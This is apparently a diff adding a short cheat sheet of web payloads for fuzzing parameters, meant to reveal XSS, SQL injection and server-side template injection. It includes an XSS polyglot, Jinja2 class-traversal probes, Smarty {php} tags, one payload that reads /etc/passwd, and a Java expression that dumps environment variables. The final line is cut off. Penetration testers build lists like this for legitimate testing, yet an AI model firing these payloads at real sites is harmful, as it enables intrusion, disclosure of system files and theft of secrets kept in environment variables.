@@ -1,0 +1,13 @@
+'"><svg/onload=alert()>{{7*7}}
+
+
+Use the above payload when fuzzing parameters to find indicators of SQLi, XSS or SSTI 
+{{ '7'*7 }}
+{{ [].class.base.subclasses() }} # get all classes
+{{''.class.mro()[1].subclasses()}}
+{%for c in [1,2,3] %}{{c,c,c}}{% endfor %}
+{$enginename.version} aaaaaaaaaaa
+{php}print "Hello"{/php}
+{php}$s = file_get_contents('/etc/passwd',NULL, NULL, 0, 100); var_dump($s);{/php}
+${131*7}
+${T(java.lang.System).getenv()
